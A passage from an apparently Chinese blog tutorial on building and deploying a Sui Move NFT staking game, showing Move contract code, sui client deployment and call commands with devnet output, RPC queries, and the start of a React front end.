function_ invoke__">none</span>(),</span><br><span class="line">            ctx</span><br><span class="line">        );</span><br><span class="line">        transfer::<span class="title function_ invoke__">freeze_object</span>(metadata);</span><br><span class="line">        transfer::<span class="title function_ invoke__">share_object</span>(treasury_cap)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// Manager can mint new coins</span></span><br><span class="line">    <span class="title function_ invoke__">public</span>(friend) fun <span class="title function_ invoke__">mint</span>(</span><br><span class="line">        treasury_cap: &amp;<span class="keyword">mut</span> TreasuryCap&lt;EGG&gt;, amount: <span class="type">u64</span>, recipient: address, ctx: &amp;<span class="keyword">mut</span> TxContext</span><br><span class="line">    ) &#123;</span><br><span class="line">        coin::<span class="title function_ invoke__">mint_and_transfer</span>(treasury_cap, amount, recipient, ctx)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// Manager can burn coins</span></span><br><span class="line">    <span class="title function_ invoke__">public</span>(friend) fun <span class="title function_ invoke__">burn</span>(treasury_cap: &amp;<span class="keyword">mut</span> TreasuryCap&lt;EGG&gt;, coin: Coin&lt;EGG&gt;) &#123;</span><br><span class="line">        coin::<span class="title function_ invoke__">burn</span>(treasury_cap, coin);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="2-7-chu-shi-hua-fang-fa-he-entry-fang-fa">2.7 初始化方法和 entry 方法</span></h3><p><code>fox</code> 模块作为整个包的入口模块，将对所有模块进行初始化，并提供 entry 方法。</p><p>我们在 fox 模块中设置了 <code>Global</code> 作为全局参数的结构体，用来保存不同模块需要用到的不同对象，一来方便我们看到系统需要处理的对象信息，二来减少了方法调用时需要传入的参数个数，通过Global对象将不同模块的对象进行分发，可以有效减少代码复杂度。</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件: fox.move</span></span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">Global</span> has key &#123;</span><br><span class="line">        id: UID,</span><br><span class="line">        minting_enabled: <span class="type">bool</span>,</span><br><span class="line">        balance: Balance&lt;SUI&gt;,</span><br><span class="line">        pack: Pack,</span><br><span class="line">        barn: Barn,</span><br><span class="line">        barn_registry: BarnRegistry,</span><br><span class="line">        foc_registry: FoCRegistry,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fun <span class="title function_ invoke__">init</span>(ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="comment">// 初始化 FoC 管理权限</span></span><br><span class="line">        <span class="title function_ invoke__">transfer</span>(token_helper::<span class="title function_ invoke__">init_foc_manage_cap</span>(ctx), <span class="title function_ invoke__">sender</span>(ctx));</span><br><span class="line">        <span class="comment">// 初始化全局设置</span></span><br><span class="line">        <span class="title function_ invoke__">share_object</span>(Global &#123;</span><br><span class="line">            id: object::<span class="title function_ invoke__">new</span>(ctx),</span><br><span class="line">            minting_enabled: <span class="literal">true</span>,</span><br><span class="line">            balance: balance::<span class="title function_ invoke__">zero</span>(),</span><br><span class="line">            barn_registry: barn::<span class="title function_ invoke__">init_barn_registry</span>(ctx),</span><br><span class="line">            pack: barn::<span class="title function_ invoke__">init_pack</span>(ctx),</span><br><span class="line">            barn: barn::<span class="title function_ invoke__">init_barn</span>(ctx),</span><br><span class="line">            foc_registry: token_helper::<span class="title function_ invoke__">init_foc_registry</span>(ctx),</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 初始化时间设置权限</span></span><br><span class="line">        <span class="title function_ invoke__">transfer</span>(config::<span class="title function_ invoke__">init_time_manager_cap</span>(ctx), @<span class="number">0xa3e46ec682bb5082849c240d2f2d20b0f6e054aa</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>除了之前介绍过的 mint 方法，我们还提供用于质押和提取 NFT 的 entry 方法：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件： fox.move</span></span><br><span class="line">        public entry fun <span class="title function_ invoke__">add_many_to_barn_and_pack</span>(</span><br><span class="line">        global: &amp;<span class="keyword">mut</span> Global,</span><br><span class="line">        tokens: vector&lt;FoxOrChicken&gt;,</span><br><span class="line">        ctx: &amp;<span class="keyword">mut</span> TxContext,</span><br><span class="line">    ) &#123;</span><br><span class="line">        barn::<span class="title function_ invoke__">stake_many_to_barn_and_pack</span>(&amp;<span class="keyword">mut</span> global.barn_registry, &amp;<span class="keyword">mut</span> global.barn, &amp;<span class="keyword">mut</span> global.pack, tokens, ctx);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">claim_many_from_barn_and_pack</span>(</span><br><span class="line">        global: &amp;<span class="keyword">mut</span> Global,</span><br><span class="line">        treasury_cap: &amp;<span class="keyword">mut</span> TreasuryCap&lt;EGG&gt;,</span><br><span class="line">        tokens: vector&lt;ID&gt;,</span><br><span class="line">        unstake: <span class="type">bool</span>,</span><br><span class="line">        ctx: &amp;<span class="keyword">mut</span> TxContext,</span><br><span class="line">    ) &#123;</span><br><span class="line">        barn::<span class="title function_ invoke__">claim_many_from_barn_and_pack</span>(</span><br><span class="line">            &amp;<span class="keyword">mut</span> global.foc_registry,</span><br><span class="line">            &amp;<span class="keyword">mut</span> global.barn_registry,</span><br><span class="line">            &amp;<span class="keyword">mut</span> global.barn,</span><br><span class="line">            &amp;<span class="keyword">mut</span> global.pack,</span><br><span class="line">            treasury_cap,</span><br><span class="line">            tokens,</span><br><span class="line">            unstake,</span><br><span class="line">            ctx</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3><span id="2-8-shi-jian-chuo-wen-ti">2.8 时间戳问题</span></h3><p>目前 Sui 区块链还没有完全实现区块时间，而目前提供的 <code>tx_context::epoch()</code> 的精度为24小时，无法满足游戏需求。因此在游戏中，我们通过手动设置时间戳来模拟时间增加，以确保游戏顺利进行。</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件: barn.move</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">BarnRegistry</span> has key, store &#123;</span><br><span class="line">        id: UID,</span><br><span class="line">        <span class="comment">// 其他属性省略</span></span><br><span class="line">        <span class="comment">// fake_timestamp</span></span><br><span class="line">        timestamp: <span class="type">u64</span>,</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="title function_ invoke__">public</span>(friend) fun <span class="title function_ invoke__">set_timestamp</span>(reg: &amp;<span class="keyword">mut</span> BarnRegistry, current: <span class="type">u64</span>, _ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        reg.timestamp = current;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">// 当前时间戳</span></span><br><span class="line">    fun <span class="title function_ invoke__">timestamp_now</span>(reg: &amp;<span class="keyword">mut</span> BarnRegistry, _ctx: &amp;<span class="keyword">mut</span> TxContext): <span class="type">u64</span> &#123;</span><br><span class="line">        reg.timestamp</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在初始化时，将设置时间的能力给到了一个预先生成的专门用于设置时间戳的地址 <code>0xa3e46ec682bb5082849c240d2f2d20b0f6e054aa</code>。</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件: config.move</span></span><br><span class="line">        <span class="comment">// Manager cap to set time</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">TimeManagerCap</span> has key, store &#123; id: UID &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">public</span>(friend) fun <span class="title function_ invoke__">init_time_manager_cap</span>(ctx: &amp;<span class="keyword">mut</span> TxContext): TimeManagerCap &#123;</span><br><span class="line">        TimeManagerCap &#123; id: object::<span class="title function_ invoke__">new</span>(ctx) &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件: fox.move</span></span><br><span class="line">        fun <span class="title function_ invoke__">init</span>(ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="title function_ invoke__">transfer</span>(config::<span class="title function_ invoke__">init_time_manager_cap</span>(ctx), @<span class="number">0xa3e46ec682bb5082849c240d2f2d20b0f6e054aa</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        public entry fun <span class="title function_ invoke__">set_timestamp</span>(_: &amp;TimeManagerCap, global: &amp;<span class="keyword">mut</span> Global, current: <span class="type">u64</span>, ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        barn::<span class="title function_ invoke__">set_timestamp</span>(&amp;<span class="keyword">mut</span> global.barn_registry, current, ctx)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>之后，我们可以设置定时任务进行时间戳更新，通过调用设置时间的命令进行，详细结果可以查看 3.2 节合约命令行调用：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sui client call --<span class="keyword">function</span> set_timestamp --module fox --package <span class="variable">$&#123;fox_game&#125;</span> --args <span class="variable">$&#123;time_cap&#125;</span> <span class="variable">$&#123;global&#125;</span> \&quot;$(<span class="built_in">date</span> +%s)\&quot; --gas-budget 30000</span><br></pre></td></tr></table></figure><p>至此，我们介绍了合约部分的主要功能，详细的代码可以阅读项目仓库。</p><h2><span id="0x3-he-yue-bu-shu-he-diao-yong">0x3 合约部署和调用</span></h2><p>下面，我们首先将部署合约，并通过命令行进行方法的调用。</p><h3><span id="3-1-he-yue-bu-shu">3.1 合约部署</span></h3><p>通过以下命令可以编译和部署合约：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sui move build</span><br><span class="line">sui client publish . --gas-budget 300000</span><br></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sui client publish . --gas-budget 300000</span><br><span class="line">UPDATING GIT DEPENDENCY https://github.com/MystenLabs/sui.git</span><br><span class="line">INCLUDING DEPENDENCY MoveStdlib</span><br><span class="line">INCLUDING DEPENDENCY Sui</span><br><span class="line">BUILDING fox_game</span><br><span class="line">----- Certificate ----</span><br><span class="line">Transaction Hash: 5FZi4YxiiBJsCj67JSSzkVZvHdJjKKPtMMMrfGbmPXvH</span><br><span class="line">Transaction Signature: AA==@G9yAoybgfIEi7Wj8HFYeEFwG5WPtJ4FlJ+/jaMXFPyjWg4pUun3WQpB4VH5gim/FzqspMY7QAJcd0iTyJ910Dw==@htyihgkhXVia7MCmWeGtDeU96b7w1ivXPKBAV37DZoo=</span><br><span class="line">Signed Authorities Bitmap: RoaringBitmap&lt;[0, 1, 2]&gt;</span><br><span class="line">Transaction Kind : Publish</span><br><span class="line">Sender: 0xefbb0d3f2dc566f1f4fa844621bee76b43c9579a</span><br><span class="line">Gas Payment: Object ID: 0x0942e72397f46a831ce61003601cbb05697e7a83, version: 0x20f, digest: 0xc318f23ac2772738efe1b958be0b51e3c49d9c772d5aede9f41e1dc69edeb2ea</span><br><span class="line">Gas Price: 1</span><br><span class="line">Gas Budget: 300000</span><br><span class="line">----- Transaction Effects ----</span><br><span class="line">Status : Success</span><br><span class="line">Created Objects:</span><br><span class="line">    - 省略了其他的创建的对象</span><br><span class="line">  - ID: 0x17db4feb4652b8b5ce9ebf6dc7d29463b08e234e , Owner: Shared</span><br><span class="line">  - ID: 0x1d525318e381f93dd2b2f043d2ed96400b4f16d9 , Owner: Immutable</span><br><span class="line">  - ID: 0x59a85fbef4bc17cd73f8ff89d227fdcd6226c885 , Owner: Immutable</span><br><span class="line">  - ID: 0xe364474bd00b7544b9393f0a2b0af2dbea143fd3 , Owner: Account Address ( 0xa3e46ec682bb5082849c240d2f2d20b0f6e054aa )</span><br><span class="line">  - ID: 0xe4ffefc480e20129ff7893d7fd550b17fda0ab0f , Owner: Shared</span><br><span class="line">  - ID: 0xe572b53c8fa93602ae97baca3a94e231c2917af6 , Owner: Account Address ( 0xefbb0d3f2dc566f1f4fa844621bee76b43c9579a )</span><br><span class="line">Mutated Objects:</span><br><span class="line">  - ID: 0x0942e72397f46a831ce61003601cbb05697e7a83 , Owner: Account Address ( 0xefbb0d3f2dc566f1f4fa844621bee76b43c9579a )</span><br></pre></td></tr></table></figure><p>可以通过交易哈希 <code>5FZi4YxiiBJsCj67JSSzkVZvHdJjKKPtMMMrfGbmPXvH</code> 在 sui explorer 中查看部署的合约信息：</p><p><img src="https://user-images.githubusercontent.com/3297411/215304390-507211a2-638c-4c97-ae58-56ea419e8fcd.png" alt="Untitled 1"></p><p>通过 <code>sui client object &lt;object_id&gt;</code> 可以查看创建的 object 的属性，可以知道：</p><ul><li><code>0x17db4feb4652b8b5ce9ebf6dc7d29463b08e234e</code> 为代币 EGG 的 TreasuryCap 的 ObjectId</li><li><code>0x1d525318e381f93dd2b2f043d2ed96400b4f16d9</code> 为 EGG 的 CoinMetadata</li><li><code>0x59a85fbef4bc17cd73f8ff89d227fdcd6226c885</code> 为部署的地址</li><li><code>0xe364474bd00b7544b9393f0a2b0af2dbea143fd3</code> 为 TimeManagerCap</li><li><code>0xe4ffefc480e20129ff7893d7fd550b17fda0ab0f</code> 为 Global 对象</li><li><code>0xe572b53c8fa93602ae97baca3a94e231c2917af6</code> 为 FoCManagerCap 对象</li></ul><p>这些对象将在之后的命令行调用和前端项目中使用到。其他省略的创建的对象为 Trait 对象，在之后不会使用到。</p><h3><span id="3-2-he-yue-ming-ling-xing-diao-yong">3.2 合约命令行调用</span></h3><ol><li><p>设置环境变量</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> fox_game=0x59a85fbef4bc17cd73f8ff89d227fdcd6226c885</span><br><span class="line"><span class="built_in">export</span> global=0xe4ffefc480e20129ff7893d7fd550b17fda0ab0f</span><br><span class="line"><span class="built_in">export</span> egg_treasury=0x17db4feb4652b8b5ce9ebf6dc7d29463b08e234e</span><br><span class="line"><span class="built_in">export</span> time_cap=0xe364474bd00b7544b9393f0a2b0af2dbea143fd3</span><br></pre></td></tr></table></figure></li><li><p>设置时间戳</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 需要切换到时间戳的管理地址 0xa3e46ec682bb5082849c240d2f2d20b0f6e054aa</span></span><br><span class="line">sui client switch --address 0xa3e46ec682bb5082849c240d2f2d20b0f6e054aa</span><br><span class="line"><span class="comment"># 设置时间戳</span></span><br><span class="line">sui client call --<span class="keyword">function</span> set_timestamp --module fox --package <span class="variable">$&#123;fox_game&#125;</span> --args <span class="variable">$&#123;time_cap&#125;</span> <span class="variable">$&#123;global&#125;</span> \&quot;$(<span class="built_in">date</span> +%s)\&quot; --gas-budget 30000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前时间戳</span></span><br><span class="line">curl https://fullnode.devnet.sui.io:443 -H <span class="string">&quot;Content-Type: application/json&quot;</span> -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span></span><br><span class="line"><span class="string">  &quot;id&quot;: 1,</span></span><br><span class="line"><span class="string">  &quot;method&quot;: &quot;sui_getObject&quot;,</span></span><br><span class="line"><span class="string">  &quot;params&quot;:[</span></span><br><span class="line"><span class="string">      &quot;0xe4ffefc480e20129ff7893d7fd550b17fda0ab0f&quot;</span></span><br><span class="line"><span class="string">  ]</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> | jq .result.details.data.fields.barn_registry</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果，可以看到时间戳已经被设置为 1674831518</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;type&quot;</span>: <span class="string">&quot;0x59a85fbef4bc17cd73f8ff89d227fdcd6226c885::barn::BarnRegistry&quot;</span>,</span><br><span class="line">  <span class="string">&quot;fields&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;egg_per_alpha&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;id&quot;</span>: <span class="string">&quot;0x48136d916ea8a148ab864fdb1fc668f6e6dcf3ff&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;last_claim_timestamp&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;1674831518&quot;</span>,</span><br><span class="line">    <span class="string">&quot;total_alpha_staked&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;total_chicken_staked&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;total_egg_earned&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;unaccounted_rewards&quot;</span>: <span class="string">&quot;8518518&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后的每一步操作前都需要同步一次时间戳，保证数据正确。</p></li><li><p>铸造 NFT</p><p>使用以下命令进行铸造：</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看当前gas</span></span><br><span class="line">sui client switch --address 0x659f89084673bf4a993cdea89a94dabf93a2ddb4</span><br><span class="line">sui client gas</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">Object ID                  |  Gas Value </span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line"> 0x0bd32adfbfc73e8daa42eef21b4e4e6cc7081240 |    25219   </span><br><span class="line"> 0x2ad1e472502aefd87c3767157391ebc1f169c6b5 |   9928743  </span><br><span class="line"> 0x3cd2bb1e03326e5141203cc008e6d2eb44a0df05 |  10000000  </span><br><span class="line"> 0x5f2c80c89bedddf92f0dc32cfa16b0ecf76a4680 |  10000000  </span><br><span class="line"> 0x635ce8d2e9a9c0056ff1cd8591baee16fe010911 |  10000000</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mint 1 个 NFT</span></span><br><span class="line">sui client call --<span class="keyword">function</span> mint --module fox --package <span class="variable">$&#123;fox_game&#125;</span> --args <span class="variable">$&#123;global&#125;</span> <span class="variable">$&#123;egg_treasury&#125;</span> \&quot;1\&quot; <span class="literal">false</span> \[0x3cd2bb1e03326e5141203cc008e6d2eb44a0df05\] \[\] --gas-budget 100000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line">----- Certificate ----</span><br><span class="line">Transaction Hash: 7p1nmTPYE9884gBCJL6sah2t6Vzh9P59MUeFVURXaEFx</span><br><span class="line">Transaction Signature: AA==@TNx7guUd7EjEg4s8jyOf+kTkuhVqmzrZWGKzcJNM3iHqcCRk0+pzITmFth8dYM6qKnYAvT3eeSkKNDUaQF2LAA==@oC1nequkpzyJfYuKx7DqIZFNUfF66e+6DEF1Urqo/EM=</span><br><span class="line">Signed Authorities Bitmap: RoaringBitmap&lt;[1, 2, 3]&gt;</span><br><span class="line">Transaction Kind : Call</span><br><span class="line">Package ID : 0x59a85fbef4bc17cd73f8ff89d227fdcd6226c885</span><br><span class="line">Module : fox</span><br><span class="line">Function : mint</span><br><span class="line">Arguments : [<span class="string">&quot;0xe4ffefc480e20129ff7893d7fd550b17fda0ab0f&quot;</span>, <span class="string">&quot;0x17db4feb4652b8b5ce9ebf6dc7d29463b08e234e&quot;</span>, [1,0,0,0,0,0,0,0], <span class="string">&quot;&quot;</span>, [<span class="string">&quot;0x3cd2bb1e03326e5141203cc008e6d2eb44a0df05&quot;</span>], []]</span><br><span class="line">Type Arguments : []</span><br><span class="line">Sender: 0x659f89084673bf4a993cdea89a94dabf93a2ddb4</span><br><span class="line">Gas Payment: Object ID: 0x2ad1e472502aefd87c3767157391ebc1f169c6b5, version: 0x215, digest: 0x197c624ca59151af7cd968b985062fa3e0dbf21711777d7b4602215664233c5b</span><br><span class="line">Gas Price: 1</span><br><span class="line">Gas Budget: 100000</span><br><span class="line">----- Transaction Effects ----</span><br><span class="line">Status : Success</span><br><span class="line">Created Objects:</span><br><span class="line">  - ID: 0x185aa8a244c74ddfe83c38618b46c744425cd7f5 , Owner: Object ID: ( 0x2ba674fcac290baa2927ff26110463f337237f0d )</span><br><span class="line">  - ID: 0x6917cbcf0e6e58184a98e05ad6bbc70a75755d28 , Owner: Object ID: ( 0x2ed343ceebf792a36b2ff0e918b801e34399f4ed )</span><br><span class="line">  - ID: 0x84fe8e597bcb9387b2911b5ef39b90bb111e71a2 , Owner: Account Address ( 0x659f89084673bf4a993cdea89a94dabf93a2ddb4 )</span><br><span class="line">Mutated Objects:</span><br><span class="line">  - ID: 0x17db4feb4652b8b5ce9ebf6dc7d29463b08e234e , Owner: Shared</span><br><span class="line">  - ID: 0x2ad1e472502aefd87c3767157391ebc1f169c6b5 , Owner: Account Address ( 0x659f89084673bf4a993cdea89a94dabf93a2ddb4 )</span><br><span class="line">  - ID: 0x3cd2bb1e03326e5141203cc008e6d2eb44a0df05 , Owner: Account Address ( 0x659f89084673bf4a993cdea89a94dabf93a2ddb4 )</span><br><span class="line">  - ID: 0xe4ffefc480e20129ff7893d7fd550b17fda0ab0f , Owner: Shared</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li><code>\&quot;1\&quot;</code> 表示铸造的数量为 1；</li><li><code>false</code> 表示不质押，如果要铸造的同时进行质押，可以修改为 <code>true</code>；</li><li><code>\[0x3cd2bb1e03326e5141203cc008e6d2eb44a0df05\]</code> 是用于支付 0.0099 SUI 铸造费用的 SUI 对象；</li><li><code>\[\]</code> 表示用于支付 <code>EGG</code> 的对象。</li></ul><p>可以看到生成的对象中， <code>0x84fe8e597bcb9387b2911b5ef39b90bb111e71a2</code> 在地址 <code>0x659f89084673bf4a993cdea89a94dabf93a2ddb4</code> 之下，查看属性可以看到对应的 type 为 <code>0x59a85fbef4bc17cd73f8ff89d227fdcd6226c885::token_helper::FoxOrChicken</code> ，这个就是我们铸造得到的 NFT，相应的其他属性也可以查看到，命令输出结果可以查看此 <a href="https://gist.github.com/qiwihui/86e7385c635f88b539ed2f032018ca28">gist</a>。</p><p>或者，我们可以通过 <code>sui_getObjectsOwnedByAddress</code> RPC 接口可以查看地址所拥有的对象，比如对于地址 <code>0x659f89084673bf4a993cdea89a94dabf93a2ddb4</code> ，可以查看所有对象，过滤即可找到创建的对象。</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl https://fullnode.devnet.sui.io:443 -H <span class="string">&quot;Content-Type: application/json&quot;</span> -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span></span><br><span class="line"><span class="string">  &quot;id&quot;: 1,</span></span><br><span class="line"><span class="string">  &quot;method&quot;: &quot;sui_getObjectsOwnedByAddress&quot;,</span></span><br><span class="line"><span class="string">  &quot;params&quot;:[</span></span><br><span class="line"><span class="string">      &quot;0x659f89084673bf4a993cdea89a94dabf93a2ddb4&quot;</span></span><br><span class="line"><span class="string">  ]</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>质押 NFT</p><p>通过以下命令对前一步铸造的 NFT 进行质押：</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sui client call --<span class="keyword">function</span> add_many_to_barn_and_pack --module fox --package <span class="variable">$&#123;fox_game&#125;</span> --args <span class="variable">$&#123;global&#125;</span> \[0x84fe8e597bcb9387b2911b5ef39b90bb111e71a2\] --gas-budget 100000</span><br></pre></td></tr></table></figure></li><li><p>获取收益和 提取 NFT</p><p>通过以下命令获取质押收益 EGG：</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sui client call --<span class="keyword">function</span> claim_many_from_barn_and_pack --module fox --package <span class="variable">$&#123;fox_game&#125;</span> --args <span class="variable">$&#123;global&#125;</span> <span class="variable">$&#123;egg_treasury&#125;</span> <span class="string">&#x27;[&quot;0x84fe8e597bcb9387b2911b5ef39b90bb111e71a2&quot;]&#x27;</span> <span class="literal">false</span> --gas-budget 100000</span><br></pre></td></tr></table></figure><p>等 48 小时之后，将 <code>false</code> 变为 <code>true</code>，可以进行 Unstake，将质押的 NFT 提取出来。</p></li></ol><p>至此，命令行操作完成。</p><h2><span id="0x4-qian-duan-kai-fa">0x4 前端开发</span></h2><h3><span id="4-1-scaffold-move-kai-fa-jiao-shou-jia">4.1 scaffold-move 开发脚手架</span></h3><p>这个项目基于 NonceGeek DAO 的 scaffold-move 开发脚手架，这个脚手架目前包含 Aptos 和 Sui 两个公链的前端开发实例，可以可以在这个基础上快速进行 Sui 的前端部分开发。</p><p>通过运行以下步骤可以设置开发环境：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/NonceGeek/scaffold-move.git</span><br><span class="line"><span class="built_in">cd</span> scaffold-move/scaffold-sui/</span><br><span class="line">yarn</span><br><span class="line">yarn dev</span><br></pre></td></tr></table></figure><h3><span id="4-2-xiang-mu-ye-mian-jie-gou">4.2 项目页面结构</span></h3><p>项目页面主要包括三部分，位于 <code>src/pages</code> 目录：index，game 和 whitepapers：</p><ul><li>index：入口页面，做为游戏的引导页面；</li><li>game：主要的逻辑页面，涉及铸造，质押和提取；</li><li>whitepaper：白皮书页面，介绍游戏机制和玩法。</li></ul><p>我们之后的部分主要聚焦在 game 页面。game 页面功能主要包括三部分：</p><ul><li>菜单栏：包含logo，页面导航以及链接钱包；</li><li>左侧 Mint 栏：主要当前 mint 状态和 mint 操作；</li><li>右侧 Stake 栏：主要是 Stake，Unstale 和 Collect EGG 的操作。</li></ul><p><img src="https://user-images.githubusercontent.com/3297411/215304399-47738ec4-8dc2-4063-9d1a-fa5ab05f963b.png" alt="Untitled 2"></p><p>其中，质押和提取时进行的多选操作，可以通过设置选择变量进行过滤来实现：</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> [unstakedSelected, setUnstakedSelected] = useState&lt;<span class="title class_">Array</span>&lt;<span class="built_in">string</span>&gt;&gt;([])</span><br><span class="line"><span class="keyword">const</span> [stakedSelected, setStakedSelected] = useState&lt;<span class="title class_">Array</span>&lt;<span class="built_in">string</span>&gt;&gt;([]);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 设置添加和删除操作</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">addStaked</span>(<span class="params">item: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="title function_">setUnstakedSelected</span>([])</span><br><span class="line">  <span class="title function_">setStakedSelected</span>([...stakedSelected, item])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">removeStaked</span>(<span class="params">item: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="title function_">setUnstakedSelected</span>([])</span><br><span class="line">  <span class="title function_">setStakedSelected</span>(stakedSelected.<span class="title function_">filter</span>(<span class="function"><span class="params">i</span> =&gt;</span> i !== item))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addUnstaked</span>(<span class="params">item: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="title function_">setStakedSelected</span>([])</span><br><span class="line">  <span class="title function_">setUnstakedSelected</span>([...unstakedSelected, item])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">removeUnstaked</span>(<span class="params">item: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="title function_">setStakedSelected</span>([])</span><br><span class="line">  <span class="title function_">setUnstakedSelected</span>(unstakedSelected.<span class="title function_">filter</span>(<span class="function"><span class="params">i</span> =&gt;</span> i !== item))</span><br><span class="line">&#125;</span><br><span class="line">  <span class="comment">// 之后添加元素的点击事件</span></span><br><span class="line">  <span class="comment">// 处理未质押的</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">renderUnstaked</span>(<span class="params">item: <span class="built_in">any</span>, <span class="keyword">type</span>: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> itemIn = unstakedSelected.<span class="title function_">includes</span>(item.<span class="property">objectId</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">key</span>=<span class="string">&#123;item.objectId&#125;</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">marginRight:</span> &quot;<span class="attr">5px</span>&quot;, <span class="attr">marginLeft:</span> &quot;<span class="attr">5px</span>&quot;, <span class="attr">border:</span> <span class="attr">itemIn</span> ? &quot;<span class="attr">2px</span> <span class="attr">solid</span> <span class="attr">red</span>&quot; <span class="attr">:</span> &quot;<span class="attr">2px</span> <span class="attr">solid</span> <span class="attr">rgb</span>(<span class="attr">0</span>,<span class="attr">0</span>,<span class="attr">0</span>,<span class="attr">0</span>)&quot;, <span class="attr">overflow:</span> &#x27;<span class="attr">hidden</span>&#x27;, <span class="attr">display:</span> &quot;<span class="attr">inline-block</span>&quot; &#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;flex flex-col items-center&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">fontSize:</span> &quot;<span class="attr">0.75rem</span>&quot;, <span class="attr">height:</span> &quot;<span class="attr">1rem</span>&quot; &#125;&#125;&gt;</span>#&#123;item.index&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span 